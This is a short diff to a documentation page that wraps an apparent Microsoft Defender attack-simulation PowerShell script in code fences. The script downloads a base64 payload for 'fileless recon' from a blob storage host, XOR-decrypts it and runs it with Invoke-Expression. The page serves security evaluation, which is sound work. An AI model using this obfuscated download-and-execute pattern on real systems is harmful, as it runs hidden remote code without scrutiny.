@@ -25,6 +25,7 @@
 
 ## Cross Product Simulation Script
 
+```
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
 $xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
 $base64String =	(Invoke-WebRequest -URI	https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt -UseBasicParsing).Content;
@@ -45,3 +46,4 @@ $contentBytes.foreach{
         }
     };
 Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+```
